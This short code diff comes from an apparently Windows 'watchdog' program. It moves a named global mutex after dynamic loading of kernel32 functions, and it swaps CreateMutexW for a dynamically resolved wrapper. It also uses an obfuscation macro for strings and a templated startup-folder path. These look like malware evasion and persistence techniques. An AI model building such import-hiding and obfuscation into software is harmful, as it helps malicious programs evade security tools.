@@ -8,9 +8,9 @@
 
 int wmain(int argc, wchar_t* argv[])
 {
-    HANDLE hMutex = CreateMutexW(NULL, TRUE, AYW_OBFUSCATE(L"Global\\#WATCHDOGID"));
-
     load_kernel32_functions();
+
+    HANDLE hMutex = UpCreateMutexW(NULL, TRUE, AYW_OBFUSCATE(L"Global\\#WATCHDOGID"));
 
     wchar_t startupPath[MAX_PATH] = { 0 };
     SHGetFolderPathW(NULL, $BASEDIR, NULL, 0, startupPath);
